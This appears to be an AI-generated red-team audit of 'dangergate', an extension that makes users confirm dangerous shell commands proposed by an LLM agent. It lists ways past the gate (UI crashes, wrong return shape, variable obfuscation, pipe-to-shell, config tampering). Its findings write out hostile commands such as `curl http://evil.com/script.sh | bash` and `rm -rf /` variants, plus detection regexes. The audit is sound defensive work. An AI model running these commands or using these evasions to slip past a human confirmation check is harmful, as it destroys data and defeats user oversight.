# Red Team Audit — dangergate-popup

> **Target:** `docs/specs/dangergate-popup.md` + `danger-gate.ts` (implementation cross-reference)
> **Audited:** 2026-05-16
> **Status:** 🔴 Needs Remediation

---

## Summary

| Severity | Count | Description |
|----------|-------|-------------|
| 🔴 [CRITICAL] | 3 | Must fix before implementation proceeds — spec/code mismatch, silent bypass on crash, return shape mismatch risk |
| 🟡 [WARNING]  | 7 | Should address; risk of future issues — regex bugs, bypass vectors, missing timeout, config tampering |
| 🔵 [INFO]     | 5 | Observations and recommendations — rendering edge cases, pattern UX improvements, scalability notes |

---

## Findings

### 🔴 [CRITICAL] — Missing `ctx.hasUI` guard in implementation

- **Category:** Logic Gap / Security Vulnerability (Denial of Service)
- **Section:** "Environment Constraints" + Proposed Solution Overview + `danger-gate.ts` line ~106
- **Description:** The spec explicitly states: *"When `ctx.hasUI` is `false` (print mode, JSON mode), the gate should either allow-through with a log or deny-by-default."* However, the actual implementation in `danger-gate.ts` does NOT check `ctx.hasUI`. In print/JSON mode, `ctx.ui.custom()` will either throw an exception or hang indefinitely — both of which deadlock the agent turn.
- **Attack Vector / Scenario:**
  1. User runs Pi in print mode (`pi -p`) with dangergate extension loaded
  2. LLM generates a command matching a dangerous pattern (e.g., `rm -rf /tmp/stale`)
  3. Extension calls `ctx.ui.custom()` in non-interactive mode
  4. **Result A:** `ctx.ui.custom()` throws → async handler rejects → agent turn crashes or command silently executes (depending on Pi's error handling)
  5. **Result B:** `ctx.ui.custom()` returns a never-resolved promise → agent hangs indefinitely
  6. Either outcome: the extension either bypasses its own gate OR deadlocks the entire session
- **Impact:** Extension fails in any non-interactive mode (CI/CD, scripting, print mode). Worst case: command executes without confirmation because error handling defaults to pass-through.
- **Recommended Fix:** Add `if (!ctx.hasUI) { console.warn("Dangergate: dangerous command in non-interactive mode, allowing through:", cmd); return; }` at the top of the handler, immediately after the bash check. This matches the spec's chosen Approach B.

---

### 🔴 [CRITICAL] — `ctx.ui.custom()` exception bypasses the gate entirely

- **Category:** Security Vulnerability (Denial of Service → Privilege Escalation)
- **Section:** Error Scenarios + Proposed Solution
- **Description:** The `tool_call` handler is async but has no try/catch around `ctx.ui.custom()`. If the UI method throws (e.g., TUI not initialized, theme error, rendering crash), the exception propagates out of the handler. The spec says *"the handler should catch and allow-through with a warning log"* but this is only in the Error Scenarios `<details>` block — it's not enforced as a requirement.
- **Attack Vector / Scenario:**
  1. User has a terminal with corrupted state (e.g., after Ctrl+C during previous TUI operation)
  2. LLM generates dangerous command → extension calls `ctx.ui.custom()`
  3. TUI throws an internal error → async handler rejects
  4. If Pi's event system treats unhandled rejections as "pass-through" (common default), the command executes WITHOUT user confirmation
  5. Gate is completely bypassed by a runtime error condition
- **Impact:** Any UI-related crash silently allows destructive commands to execute, defeating the entire purpose of the extension.
- **Recommended Fix:** Wrap `ctx.ui.custom()` in try/catch. On exception: log warning and apply the configured non-interactive policy (default: allow-with-log). This turns a bypass into a documented degradation path.

```typescript
try {
  const ok = await ctx.ui.custom<boolean>(...);
  if (!ok) return { block: true, reason: "Blocked by user" };
} catch (err) {
  console.warn("Dangergate: UI error, allowing through:", err.message);
}
```

---

### 🔴 [CRITICAL] — Return shape `{ block: true }` may not be recognized by Pi's event system

- **Category:** Logic Gap
- **Section:** "Extension API Interface" + `danger-gate.ts` line ~120
- **Description:** The extension returns `{ block: true, reason: "..." }` to cancel a tool call. However, the reference implementation (`confirm-destructive.ts`) uses `{ cancel: true }`. If Pi's `tool_call` event handler expects `cancel` (not `block`), the denial is silently ignored and the command executes anyway — the gate appears to work (dialog shows) but never actually blocks anything.
- **Attack Vector / Scenario:**
  1. Extension shows dialog → user presses N
  2. Handler returns `{ block: true, reason: "Blocked by user" }`
  3. Pi's event system does not recognize `block` key → treats return as no-op (pass-through)
  4. Command executes despite user denial
  5. User sees file deleted / data dropped after explicitly confirming "No"
- **Impact:** Gate provides false sense of security — all denials silently become approvals. This is the worst possible failure mode: user actively tries to prevent damage and fails without any indication.
- **Recommended Fix:** Verify against Pi's Extension API documentation which return shape cancels a `tool_call`. If it's `{ cancel: true }`, update both spec and code. Add a runtime assertion or log that confirms the block was recognized.

---

### 🟡 [WARNING] — No timeout on dialog — indefinite hang possible

- **Category:** Denial of Service
- **Section:** Risk Assessment (R1) + Dialog Component Lifecycle
- **Description:** The spec acknowledges R1 ("Dialog hangs indefinitely") but defers the fix to "Future enhancement." This means production users face real deadlocks: walk away from terminal → agent stuck forever. No timeout, no auto-deny, no background progress indicator.
- **Attack Vector / Scenario:**
  1. User has dangerous command flagged → dialog appears on screen
  2. User switches to another terminal window and forgets about it
  3. Agent turn is permanently blocked — no other commands can execute
  4. If Pi processes tool calls sequentially, the entire agent is frozen until someone presses a key
  5. In headless/SSH sessions: connection drops → dialog never responds → session dead
- **Impact:** Session deadlock. User must kill and restart Pi to recover.
- **Recommended Fix:** Add configurable timeout (default: 60s). After timeout, auto-deny with logged reason. Display countdown in dialog hint line when time < 15s remaining.

---

### 🟡 [WARNING] — Regex word boundary bug: `shred\b` matches `unshred`

- **Category:** Edge Case
- **Section:** Pattern Reference P3 + Implementation `DANGEROUS_PATTERNS[2]`
- **Description:** The pattern `/shred\b/` has a word boundary only at the END. It will match commands like `unshred file.dat` or `myshredder process` — false positives that trigger unnecessary confirmations. Should be `/\bshred\b/`.
- **Attack Vector / Scenario:**
  1. User runs `unshred -r secret_file.enc` (a legitimate recovery tool)
  2. Pattern `/shred\b/` matches the "shred" substring inside "unshred"
  3. Dialog triggers unnecessarily → user fatigue → habituation to pressing Y without reading
- **Impact:** False positive erodes trust in the gate; users learn to blindly confirm, reducing effectiveness against real threats.
- **Recommended Fix:** Change `/shred\b/` to `/\bshred\b/`. Audit all patterns for missing leading `\b`.

---

### 🟡 [WARNING] — Regex word boundary bug: `/dd\s+if=/` matches `badd if=`

- **Category:** Edge Case
- **Section:** Pattern Reference P5 + Implementation `DANGEROUS_PATTERNS[4]`
- **Description:** The pattern `/dd\s+if=/` has no leading word boundary. Matches `badd if=file`, `mydd if=backup`, or any command containing the substring "dd if=" in a path or variable value. Should be `/\bdd\s+if=/`.
- **Attack Vector / Scenario:**
  1. User runs command containing string literal: `grep -r "dd if=" src/`
  2. Pattern matches "dd if=" inside the grep search string
  3. False positive triggers dialog for a read-only grep operation
- **Impact:** Same trust erosion as above; also impacts commands that reference `dd` syntax in documentation, scripts, or test data.
- **Recommended Fix:** Change `/dd\s+if=/` to `/\bdd\s+if=/`.

---

### 🟡 [WARNING] — Variable substitution bypass allows arbitrary command execution

- **Category:** Security Vulnerability (Evasion)
- **Section:** Security & Privacy ("Command obfuscation bypass") + Pattern Reference
- **Description:** The spec acknowledges this risk but labels it as an observation, not a finding with required mitigation. Commands like `CMD="rm -rf /"; $CMD` or `"rm" "-rf" "/"` bypass all patterns because regexes match literal command names only.
- **Attack Vector / Scenario:**
  1. Adversarial prompt instructs LLM to obfuscate dangerous commands
  2. LLM generates: `A=rm; B="-rf"; $A $B /important/data`
  3. No pattern matches — `$A` is a variable, not literal "rm"
  4. Command executes without gate → data destruction
- **Impact:** Sophisticated prompts can completely bypass the gate. This undermines security guarantees for users who trust the extension as comprehensive protection.
- **Recommended Fix:** Phase 1 mitigation: Document explicitly that obfuscation bypasses exist and this is NOT a comprehensive security solution. Phase 3 mitigation: Add patterns for common obfuscation markers (`$VAR\s+.*\b-\s*rf\b`, backtick/command-substitution wrapping of dangerous ops). Consider shell-command parsing library instead of regex matching for Phase 4+.

---

### 🟡 [WARNING] — Piped code execution not gated

- **Category:** Security Vulnerability (Evasion)
- **Section:** Risk Assessment (R2) + Pattern Reference
- **Description:** Commands that pipe arbitrary code into a shell interpreter bypass all patterns: `curl http://evil.com/script.sh | bash`, `echo 'rm -rf /' | sh`, `python3 -c "import os; os.system('rm -rf /')"`. None of these match any current pattern because the dangerous operation is embedded in data, not as a top-level command.
- **Attack Vector / Scenario:**
  1. LLM generates: `curl -sL https://example.com/setup.sh | bash`
  2. No pattern matches (`curl` and `bash` are individually benign)
  3. Command executes → downloads and runs arbitrary script
  4. Script performs any destructive operation without gate
- **Impact:** Entire category of dangerous operations is ungated. Remote code execution via pipes is a common LLM hallucination pattern (e.g., "install package by running setup script").
- **Recommended Fix:** Add patterns for `|\s*bash\b`, `|\s*sh\b`, `\bpip\s+install\s+https?://`. Add `\beval\b` pattern. Add `\bpython\d*\s+-c\b` as warning-level gate. Document pipe-as-bypass in user-facing documentation.

---

### 🟡 [WARNING] — Config file tampering (Phase 2) disables gates without audit trail

- **Category:** Security Vulnerability (Tampering, Repudiation)
- **Section:** Configuration Interface (Phase 2)
- **Description:** Phase 2 introduces `~/.pi/agent/dangergate.json` with `excludedPatternIndices`. An attacker with file system access can trivially disable all gates: write `{"excludedPatternIndices": [1,2,...,20]}` → extension loads → no patterns active → full shell access without confirmation. No integrity check, no tamper detection, no audit log of config changes.
- **Attack Vector / Scenario:**
  1. Attacker gains file write access (e.g., via compromised dependency in same directory)
  2. Writes config that excludes all dangerous patterns
  3. Next Pi session loads config silently → gate is neutered
  4. No log, no warning, no indicator to user that protection was disabled
- **Impact:** Complete neutralization of the safety mechanism with no visible trace.
- **Recommended Fix:** On config load: validate `excludedPatternIndices` length < total patterns (warn if >50% excluded). Log config load with pattern count. Consider file hash comparison on load (warn if config modified since last session). Never allow excluding 100% of patterns — require at least N minimum patterns active.

---

### 🟡 [WARNING] — Long single-line commands cause unbounded memory allocation during render

- **Category:** Denial of Service
- **Section:** Dialog Dimensions + Error Scenarios + `danger-gate.ts` `render()` method
- **Description:** The `render()` method calls `line.padEnd(width - 4 - indent.length)` on each command line. If the LLM generates a single-line command that is extremely long (e.g., 1MB of concatenated commands), `padEnd` creates a massive string allocation. While `slice(0, ...)` truncates it afterward, the intermediate allocation happens first. With Node.js GC pressure, this could cause pauses or OOM on constrained systems.
- **Attack Vector / Scenario:**
  1. LLM generates command: `"rm " + Array(100000).join("file_")` → single line of ~500KB
  2. `render()` calls `line.padEnd(width, ...)` → allocates full width × line length buffer
  3. GC pressure spikes → agent turn delayed or crashes
  4. If crash occurs before dialog render, command may execute unconfirmed (see CRITICAL #2)
- **Impact:** Resource exhaustion via adversarial command generation; potential OOM crash in constrained environments.
- **Recommended Fix:** Truncate input line BEFORE `padEnd`: `line.slice(0, width - indent.length - 2).padEnd(...)`. Add a hard cap on total preview characters (e.g., 4KB) and display "[... truncated]" indicator.

---

### 🟡 [WARNING] — Heredoc commands trigger false positives for embedded dangerous strings

- **Category:** Edge Case
- **Section:** Pattern Reference + Error Scenarios
- **Description:** Multi-line heredocs containing dangerous command strings as data will match patterns and trigger gates unnecessarily: `cat << 'EOF'\nrm -rf /tmp/old\nEOF` matches P1 (`\brm\s+`). The user sees a gate for a command that only *displays* text, not executes deletion.
- **Attack Vector / Scenario:**
  1. LLM generates heredoc to create a script file: `cat > deploy.sh << 'EOF'\nrm -rf /app/old\nnpm install\nEOF`
  2. Pattern matches "rm -rf" inside the heredoc body
  3. Dialog triggers → user must read multi-line content to understand it's just file creation, not execution
  4. User fatigue from false positives leads to blind confirmation habit
- **Impact:** Reduced precision of gate; user training effect degrades safety over time.
- **Recommended Fix:** This is acknowledged in Error Scenarios but needs explicit mitigation strategy. Consider: (a) document as known limitation, (b) Phase 3 adds heredoc-aware parsing, or (c) show matched substring context in dialog so user can distinguish data from intent.

---

### 🔵 [INFO] — First-match-only pattern selection hides which pattern triggered the gate

- **Category:** Logic Gap (Information Disclosure to user)
- **Section:** Pattern Reference ("first match triggers the dialog")
- **Description:** When a command matches multiple patterns, only the first matching pattern triggers the dialog and subsequent patterns are skipped (`break` statement). The user never sees *which* pattern matched — they just see "⚠ DANGEROUS COMMAND" with the raw command text. For commands that match less-obvious patterns (e.g., `fsck` or `pip uninstall -y`), users may not understand why it was flagged.
- **Recommended Action:** In Phase 3, display the matched pattern category in the dialog: `"⚠ DANGEROUS COMMAND (matched: Package manager global delete)"`. This aids user education and helps identify false positives for config tuning.

---

### 🔵 [INFO] — Unicode/emoji in command paths may corrupt dialog rendering

- **Category:** Edge Case
- **Section:** Dialog Dimensions + `render()` method
- **Description:** Commands containing Unicode multi-byte characters (CJK, emoji, RTL) render as wider/narrower than expected byte count. `line.slice(0, width - indent.length - 2)` truncates by JavaScript code units, not terminal cells. Emoji and CJK can shift rendering alignment, potentially breaking dialog borders or hint lines.
- **Recommended Action:** Use a proper terminal-width library (e.g., `string-width`) for truncation instead of `slice(0, charCount)`. Low priority but improves robustness for international users.

---

### 🔵 [INFO] — No pattern count limit in Phase 2 config — potential DoS via regex complexity

- **Category:** Scalability Issue
- **Section:** Configuration Interface (Phase 2)
- **Description:** Phase 2 allows arbitrary `additionalPatterns` strings. A user (or compromised config) could add thousands of complex regexes with catastrophic backtracking patterns (e.g., `(a+)+$`). Every bash command would then be tested against all patterns, causing severe performance degradation.
- **Recommended Action:** Cap additional patterns at N (e.g., 50). Validate each regex compiles successfully on config load — reject invalid regexes with clear error message. Consider a test harness: `pi dangergate test` to validate config against sample commands.

---

### 🔵 [INFO] — Dialog scroll position resets on each render — no state persistence across re-renders

- **Category:** Edge Case
- **Section:** Dialog Component Lifecycle + `render()` method
- **Description:** The `scrollOffset` is instance state, which persists across renders of the same dialog. However, if `visibleHeight` changes (e.g., terminal resize during open dialog), the scroll clamp logic adjusts offset but user may lose their position mid-inspection. Also, if terminal width drops below minimum, `visibleHeight` could become 1 — showing only one line at a time with no useful context.
- **Recommended Action:** Enforce minimum dialog width (e.g., 40 columns). Below that: show error message "Terminal too narrow for dangergate" and fall through to allow-with-log. Handle resize events gracefully by preserving scroll position relative to bottom of content.

---

### 🔵 [INFO] — P12 (`:wq!$/m`) gates a non-destructive operation with no clear risk

- **Category:** Logic Gap
- **Section:** Pattern Reference P12
- **Description:** The pattern `/:wq!$/m` matches vim force-quit. This is not a destructive shell command — it's an editor command. If the LLM sends this as a bash tool call, it would fail anyway (vim isn't running in bash). Gating it adds noise without safety value.
- **Recommended Action:** Remove P12 or change to informational log only. If retained, document *why* it matters (e.g., vim commands accidentally sent via bash tool could have side effects in certain environments).

---

## STRIDE Checklist Summary

| Category | Status | Notes |
|----------|--------|-------|
| Spoofing | ✅ N/A | Local extension — no identity/auth surface. Gate validates against local user only. |
| Tampering | ⚠️ Partial risk | Config file (Phase 2) can be modified to disable gates without detection. Extension source is audit-able but not integrity-checked on load. |
| Repudiation | ⚠️ Partial coverage | Spec plans Phase 4 logging (`pi.appendEntry()`) for blocked/allowed decisions. Currently: no audit trail of gate outcomes. Config changes untracked. |
| Info Disclosure | ✅ Low risk | Dialog shows command text (already known to LLM). No sensitive data leaked beyond the command itself. Error messages don't expose internals. |
| Denial of Service | ❌ Significant risk | No timeout → indefinite hang possible. Unbounded regex count in Phase 2. Large command strings cause memory pressure on render. |
| Privilege Escalation | ⚠️ Indirect risk | Gate bypass (via crash, wrong return shape, or obfuscation) gives LLM full shell without confirmation. The gate itself doesn't escalate privileges but its failure modes enable escalation. |

---

## Remediation Priority

1. **Add `ctx.hasUI` guard** — one-line check before `ctx.ui.custom()` call; prevents deadlock in non-interactive mode [CRITICAL]
2. **Verify correct return shape** (`block` vs `cancel`) against Pi API docs; update code and spec accordingly [CRITICAL]
3. **Wrap `ctx.ui.custom()` in try/catch** — prevents bypass on UI crash [CRITICAL]
4. **Fix regex word boundaries** (`shred`, `dd if=`) — add missing `\b` anchors [WARNING]
5. **Add pipe/eval patterns** for common evasion vectors (Phase 1 or early Phase 2) [WARNING]
6. **Implement dialog timeout** with auto-deny default (60s) [WARNING]
7. **Truncate input before padEnd** in render method — prevents unbounded allocation [WARNING]
8. **Config validation** for Phase 2: reject invalid regexes, cap pattern count, log exclusion percentage [WARNING/INFO]

---

*Report generated by Red Team Audit skill · 2026-05-16*
